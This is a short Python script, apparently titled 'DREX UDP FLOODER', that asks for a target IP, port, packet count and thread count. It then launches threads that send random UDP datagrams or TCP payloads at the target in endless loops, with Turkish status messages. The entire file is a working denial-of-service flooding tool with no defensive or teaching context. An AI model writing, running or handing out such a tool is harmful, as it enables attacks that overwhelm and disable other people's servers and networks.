import random
import socket
import threading

print("-DREX-")
print("-UDP FLOODER-")
ip = str(input(" IP:"))
port = int(input(" PORT:"))
choice = str(input(" PORT UDP?(y/n):"))
times = int(input(" The number of packages to be sent:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[+]","[+]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"PAKET GÖNDERİLDİ")
		except:
			print("[-]HATA")

def run2():
	data = random._urandom(16)
	i = random.choice(("[+]","[+]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"PAKET GÖNDERİLDİ")
		except:
			s.close()
			print("[-]HATA")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
